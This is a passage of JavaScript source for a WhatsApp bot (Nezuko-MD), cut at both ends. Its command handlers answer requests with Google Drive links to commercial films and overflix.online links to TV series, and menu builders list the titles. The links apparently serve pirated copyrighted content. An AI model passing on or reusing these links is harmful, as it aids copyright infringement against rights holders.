Com amor, Simon: https://drive.google.com/file/d/1mzr_E-OmjQpwouBx2oOo3y4qZStxN-2Z/view?usp=drivesdk`)
break

case'filme39':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


After 1: https://drive.google.com/file/d/1YX8pGsFAY1vrKu8rl96VdN8-vhpUQ2mY/view?usp=drivesdk`)
break

case'filme40':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


A 5 passos de você: https://drive.google.com/file/d/132_vwYz5zXMQORAhWmTwQHlLZ47Tpu7V/view?usp=drivesdk`)
break

case'filme41':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Hannah Montana: https://drive.google.com/file/d/1Fx1Dn-JV8LOsfiBYL8-ihdz4b2fVnNbg/view?usp=drivesdk`)
break

case'filme42':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Ponte para Terabitia: https://drive.google.com/file/d/1F0iFKt2xgglz7pldUuMaE5gxLs55Ta7T/view?usp=drivesdk`)
break

case'filme43':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Sr. & Sra. Smith: https://drive.google.com/file/d/1bJsB7wjvU7WWuFSJzwcz0VKQ6vz2UMlA/view?usp=drivesdk`)
break

case'filme44':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Um laço de amor: https://drive.google.com/file/d/17x2Um_DDg7Px2y1EINwpA8jLdgDx-AeM/view?usp=drivesdk`)
break

case'filme45':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Transformers: https://drive.google.com/folderview?id=10QVCb14pAWod2rQ67n1BlLocP71yF8Ez`)
break

case'filme46':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Oito mulheres e um segredo: https://drive.google.com/file/d/1jNUcLsJqRNcrYD_pMkrUc066TIEWhFRf/view?usp=drivesdk`)
break

case'filme47':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


A garota do trem: https://drive.google.com/file/d/10nc2orAOhI_fLHWLCJfffuFVuUlKo158/view?usp=drivesdk`)
break

case'filme48':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Nerve: https://drive.google.com/file/d/1kbS-l4Af_PR_wFmykYAE_pq6qwfORWjD/view?usp=drivesdk`)
break

case'filme49':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Esquadrão 6: https://drive.google.com/file/d/13voArwUsQMgC3o7Q0ZIf87MKjQb3laU6/view?usp=drivesdk`)
break

case'filme50':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


A chegada: https://drive.google.com/file/d/17ZTQ4VaUwM_m7immHx4XDWvR_fc1K0Vt/view?usp=drivesdk`)
break

case'filme51':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Jumanji- bem vindo a selva: https://drive.google.com/file/d/1j5puYj2JzBgDcH0QKIR__UY1o1Zvs022/view?usp=drivesdk`)
break

case'filme52':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Monte carlo: https://drive.google.com/file/d/1GmN34mKHGd5rp82cX3LVv4mAzz1XoVbB/view?usp=drivesdk`)
break

case'filme53':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Nasce uma estrela: https://drive.google.com/file/d/1t8ZLbRMDsUhnzGMbjDie-7jTKDNxy7xF/view?usp=drivesdk`)
break

case'filme54':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Mistério no mediterrâneo: https://drive.google.com/file/d/1J4JMLzT6qSgYl1nX75RIEPc4DVc7G9FS/view?usp=drivesdk`)
break

case'filme55':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Norbit: https://drive.google.com/file/d/1UkgrI-fM6rOAHmFEaABtJQP_Lx6jantD/view?usp=drivesdk`)
break

case 'filmelist':
case 'menufilme':
botaoale = [
{title: "",
rows: [
{title: "➽️️ 𝐇𝐎𝐌𝐄𝐌 𝐀𝐑𝐀𝐍𝐇𝐀 𝐒𝐄𝐌 𝐕𝐎𝐋𝐓𝐀 𝐏𝐑𝐀 𝐂𝐀𝐒𝐀  ", rowId: `${prefix}filme2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐂𝐈𝐃𝐀𝐃𝐄 𝐏𝐄𝐑𝐃𝐈𝐃𝐀 ", rowId: `${prefix}filme3`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐓𝐇𝐎𝐑 𝐀𝐌𝐎𝐑 𝐄 𝐓𝐑𝐎𝐕𝐀̃𝐎 ", rowId: `${prefix}filme4`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐏𝐈𝐍𝐎́𝐐𝐔𝐈𝐎 2", rowId: `${prefix}filme5`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐑𝐔𝐀 𝐃𝐎 𝐌𝐄𝐃𝐎 1", rowId: `${prefix}filme6`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐍𝐀 𝐌𝐄𝐍𝐓𝐄 𝐃𝐎 𝐃𝐄𝐌𝐎̂𝐍𝐈𝐎", rowId: `${prefix}filme7`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐎 𝐇𝐎𝐌𝐄𝐌 𝐍𝐀𝐒 𝐓𝐑𝐄𝐕𝐀𝐒", rowId: `${prefix}filme8`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐂𝐎𝐌𝐏𝐈𝐋𝐀𝐃𝐎𝐒 𝐓𝐄𝐑𝐑𝐎𝐑 ", rowId: `${prefix}filme9`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐇𝐀𝐋𝐋𝐎𝐖𝐄𝐄𝐍𝐒 𝐊𝐈𝐋𝐋𝐒 𝐎 𝐓𝐄𝐑𝐑𝐎𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐀 ", rowId: `${prefix}filme10`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐎 𝐏𝐑𝐄𝐃𝐀𝐃𝐎𝐑  𝐀 𝐂𝐀𝐂̧𝐀𝐃𝐀", rowId: `${prefix}filme11`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐎𝐒 𝐏𝐑𝐈𝐌𝐄𝐈𝐑𝐎𝐒 𝐏𝐀𝐒𝐒𝐎𝐒 𝐃𝐄 𝐆𝐑𝐎𝐎𝐓", rowId: `${prefix}filme12`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐓𝐀́ 𝐂𝐇𝐎𝐕𝐄𝐍𝐃𝐎 𝐇𝐀𝐌𝐁𝐔́𝐑𝐆𝐔𝐄𝐑", rowId: `${prefix}filme13`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐈𝐍𝐈𝐎𝐍𝐒 𝐀 𝐎𝐑𝐈𝐆𝐄𝐌 𝐃𝐄 𝐆𝐑𝐔", rowId: `${prefix}filme14`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐓𝐇𝐄 𝐒𝐀𝐍𝐃𝐌𝐀𝐍", rowId: `${prefix}filme15`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐓𝐇𝐄 𝐁𝐀𝐓𝐌𝐀𝐍", rowId: `${prefix}filme16`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀𝐒 𝐁𝐑𝐀𝐍𝐐𝐔𝐄𝐋𝐀𝐒", rowId: `${prefix}filme17`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓𝐄𝐋𝐀𝐑", rowId: `${prefix}filme18`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐔𝐌 𝐎𝐋𝐇𝐀𝐑 𝐃𝐎 𝐏𝐀𝐑𝐀𝐈𝐒𝐎", rowId: `${prefix}filme19`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐁𝐀𝐑𝐁𝐈𝐄", rowId: `${prefix}filme20`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐀𝐙𝐄 𝐑𝐔𝐍𝐍𝐄𝐑", rowId: `${prefix}filme21`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐀𝐃 𝐌𝐀𝐗", rowId: `${prefix}filme22`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐇𝐎𝐌𝐄𝐌 𝐀𝐑𝐀𝐍𝐇𝐀", rowId: `${prefix}filme23`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐒𝐇𝐄𝐑𝐋𝐎𝐂𝐊 𝐇𝐎𝐌𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme24`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐂𝐈𝐍𝐐𝐔𝐄𝐍𝐓𝐀 𝐓𝐎𝐍𝐒 𝐃𝐄 𝐂𝐈𝐍𝐙𝐀 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme25`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐂𝐑𝐄𝐏𝐔́𝐒𝐂𝐔𝐋𝐎 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme26`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐁𝐀𝐃 𝐁𝐎𝐘𝐒 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme27`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐕𝐈𝐍𝐆𝐀𝐃𝐎𝐑𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme28`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐕𝐄𝐋𝐎𝐙𝐄𝐒 𝐄 𝐅𝐔𝐑𝐈𝐎𝐒𝐎𝐒 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme29`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐁𝐀𝐓𝐌𝐀𝐍", rowId: `${prefix}filme30`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀𝐒 𝐕𝐀𝐍𝐓𝐀𝐆𝐄𝐍𝐒 𝐃𝐄 𝐒𝐄𝐑 𝐈𝐍𝐕𝐈𝐒𝐈́𝐕𝐄𝐋", rowId: `${prefix}filme31`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐎𝐀𝐍𝐀", rowId: `${prefix}filme32`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐀 𝐃𝐑 𝐏𝐑𝐎𝐓𝐄𝐂̧𝐀̃𝐎 𝐏𝐀𝐑𝐀 𝐏𝐑𝐈𝐍𝐂𝐄𝐒𝐀𝐒:", rowId: `${prefix}filme33`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀𝐒 𝐂𝐑𝐎̂𝐍𝐈𝐂𝐀𝐒 𝐃𝐄 𝐍𝐀́𝐑𝐍𝐈𝐀 (𝐓𝐎𝐃𝐎𝐒", rowId: `${prefix}filme34`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀 𝐂𝐔𝐋𝐏𝐀 𝐄́ 𝐃𝐀𝐒 𝐄𝐒𝐓𝐑𝐄𝐋𝐀𝐒", rowId: `${prefix}filme35`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐕𝐄𝐑𝐃𝐀𝐃𝐄 𝐎𝐔 𝐃𝐄𝐒𝐀𝐅𝐈𝐎:", rowId: `${prefix}filme36`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐆𝐀𝐑𝐎𝐓𝐀 𝐈𝐍𝐅𝐄𝐑𝐍𝐀𝐋", rowId: `${prefix}filme37`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐂𝐎𝐌 𝐀𝐌𝐎𝐑,𝐒𝐈𝐌𝐎𝐍", rowId: `${prefix}filme38`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀𝐅𝐓𝐄𝐑 1:", rowId: `${prefix}filme39`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀 5 𝐏𝐀𝐒𝐒𝐎𝐒 𝐃𝐄 𝐕𝐎𝐂𝐄̂:", rowId: `${prefix}filme40`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐇𝐀𝐍𝐍𝐀𝐇 𝐌𝐎𝐍𝐓𝐀𝐍𝐀-𝐎 𝐅𝐈𝐋𝐌𝐄", rowId: `${prefix}filme41`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐏𝐎𝐍𝐓𝐄 𝐏𝐀𝐑𝐀 𝐓𝐄𝐑𝐀𝐁𝐈𝐓𝐈𝐀", rowId: `${prefix}filme42`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐒𝐡.& 𝐒𝐑𝐀.𝐒𝐌𝐈𝐓𝐇", rowId: `${prefix}filme43`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐔𝐌 𝐋𝐀𝐂̧𝐎 𝐃𝐄 𝐀𝐌𝐎𝐑", rowId: `${prefix}filme44`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐓𝐑𝐀𝐍𝐒𝐅𝐎𝐑𝐌𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)", rowId: `${prefix}filme45`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐎𝐈𝐓𝐎 𝐌𝐔𝐋𝐇𝐄𝐑𝐄𝐒 𝐄 𝐔𝐌 𝐒𝐄𝐆𝐑𝐄𝐃𝐎", rowId: `${prefix}filme46`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀 𝐆𝐀𝐑𝐎𝐓𝐀 ??𝐎 𝐓𝐑𝐄𝐌:", rowId: `${prefix}filme47`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐍𝐄𝐑𝐕𝐄:", rowId: `${prefix}filme48`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐄𝐒𝐐𝐔𝐀𝐃𝐑𝐀̃𝐎 6", rowId: `${prefix}filme49`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐀 𝐂𝐇𝐄𝐆𝐀𝐃𝐀", rowId: `${prefix}filme50`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐉𝐔𝐌𝐀𝐍𝐉𝐈-𝐁𝐄𝐌 𝐕𝐈𝐍𝐃𝐎 𝐀 𝐒𝐄𝐋𝐕𝐀", rowId: `${prefix}filme51`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐎𝐍??𝐄 𝐂𝐀𝐑𝐋𝐎", rowId: `${prefix}filme52`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐍𝐀𝐒𝐂𝐄 𝐔𝐌𝐀 𝐄𝐒𝐓𝐑𝐄𝐋𝐀", rowId: `${prefix}filme53`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐌𝐈𝐒𝐓𝐄́𝐑𝐈𝐎 𝐍𝐎 𝐌𝐄𝐃𝐈𝐓𝐄𝐑𝐑𝐀̂𝐍𝐄𝐎", rowId: `${prefix}filme54`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},

{title: "➽️️ 𝐍𝐎𝐑𝐁𝐈𝐓", rowId: `${prefix}filme55`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}]
}]
sendlistA(from, "© _Copyright by Nezuko-MD", "", "[📽️] 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐅𝐈𝐋𝐌𝐄𝐒 [📽️]", "Selecione abaixo:", botaoale)

break

case'serie1':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


arcane https://overflix.online/series/arcane/`)
break

case'serie2':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


stranger-things https://overflix.online/series/stranger-things-gratis-hd/`)
break

case'serie3':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


soldados ou zumbis https://overflix.online/series/s-o-z-soldados-ou-zumbis/`)
break

case'serie4':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


o senhor dos aneis https://overflix.online/series/o-senhor-dos-aneis-os-aneis-de-poder-online-hd-gratis/`)
break

case'serie5':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


riveldade https://overflix.online/series/riverdale-online-gratis-hd-full/`)
break

case'serie6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


a casa do dragão https://overflix.online/series/a-casa-do-dragao-online-gratis-hd/`)
break

case'serie7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


sintonia https://overflix.online/series/sintonia-online-gratis/`)
break

case'serie8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


chucky https://overflix.online/series/chucky-a-serie/`)
break

case'serie9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


flash https://overflix.online/series/flash-hd-online-gratis/`)
break

case'serie10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


game of thrones https://overflix.online/series/game-of-thrones-hd-online-gratis/`)
break

case'serie11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


legados https://overflix.online/series/legados-gratis-hd-online/`)
break

case'serie12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


the hood doctor o bom doutor https://overflix.online/series/the-good-doctor-o-bom-doutor-hd-online/`)
break

case'serie13':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

the walking dead https://overflix.online/series/the-walking-dead/`)
break

case'serie14':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


peaky blinders https://overflix.online/series/peaky-blinders-sangue-apostas-e-navalhas/`)
break

case'serie15':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


diarios de um vampiro https://overflix.online/series/diarios-de-um-vampiro/`)
break

case'serie16':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


gavião arqueiro https://overflix.online/series/gaviao-arqueiro-full-online-gratis/`)
break 

case'serie17':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


westworld https://overflix.online/series/westworld-hd-gratis-online/`)
break

case'serie18':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


lucifer https://overflix.online/series/lucifer-online-hd/`)
break

case'serie19':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


lobo adolecentes https://overflix.online/series/lobo-adolescente/`)
break

case'serie20':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


la casa de papel https://overflix.online/series/la-casa-de-papel/`)
break

case'serie21':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


cobra kai https://overflix.online/series/cobra-kai-online-gratis-hd/`)
break

case'serie22':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


love victor https://overflix.online/series/love-victor-gratis-online-hd/`)
break

case'serie23':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


vikings https://overflix.online/series/vikings-hd/`)
break

case'serie24':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


cavaleiro da lua https://overflix.online/series/cavaleiro-da-lua-online-gratis-hd-full/`) 
break

case'serie25':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


fear the walking dead https://overflix.online/series/fear-the-walking-dead/`)
break

case'serie26':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


rick morty https://overflix.online/series/rick-morty/`)
break

case'serie27':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


round 6 https://overflix.online/series/round-6-online-gratis-hd-full/`)
break

case'serie28':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


carnival row https://overflix.online/series/carnival-row-online-hd/`)
break

case'serie29':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


dark https://overflix.online/series/dark/`)
break

case'serie30':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


arqueiro https://overflix.online/series/arqueiro/`)
break 

case'serie31':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


eu nunca https://overflix.online/series/eu-nunca/`) 
break

case'serie32':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


the last kingdom https://overflix.online/series/the-last-kingdom/`) 
break

case'serie33':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


o livro de boba fett https://overflix.online/series/o-livro-de-boba-fett-hd-online-gratis-full/`)
break

case'serie34':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


ragnarok https://overflix.online/series/ragnarok/`)
break 

case'serie35':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


os 100 https://overflix.online/series/os-100/`)
break

case'serie36':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


fbi https://overflix.online/series/fbi/`)
break

case'serie37':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


extracurricular https://overflix.online/series/extracurricular/`)
break

case'serie38':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


halo https://overflix.online/series/halo-online-gratis/`)
break

case'serie39':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


warrior nun https://overflix.online/series/warrior-nun-online-completo/`)
break

case'serie40':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}



anne with https://overflix.online/series/anne-with-an-e/`)
break

case'serie41':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


patrulha do destino https://overflix.online/series/patrulha-do-destino-online/`)
break

case'serie42':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


dinastia https://overflix.online/series/dinastia/`)
break

case'serie43':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


watchmen https://overflix.online/series/watchmen/`)
break

case'serie44':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


lovecraft country https://overflix.online/series/lovecraft-country-dublado-legendado-online-hd-gratis/`)
break

case 'serielist':
case 'menuserie':
botaoale = [
{title: "",
rows: [
{title: "➽️️ 𝐀𝐑𝐂𝐀𝐍𝐄 ", rowId: `${prefix}serie1`,description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐒𝐓𝐑𝐀𝐍𝐆𝐄𝐑 𝐓𝐇𝐈𝐍𝐆𝐒 ", rowId: `${prefix}serie2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐒𝐎𝐋𝐃𝐀𝐃𝐎𝐒 𝐎𝐔 𝐙𝐔𝐌𝐁𝐈𝐒 ", rowId: `${prefix}serie3`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐎 𝐒𝐄𝐍𝐇𝐎𝐑 𝐃𝐎𝐒 𝐀𝐍𝐄́𝐈𝐒 ", rowId: `${prefix}serie4`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
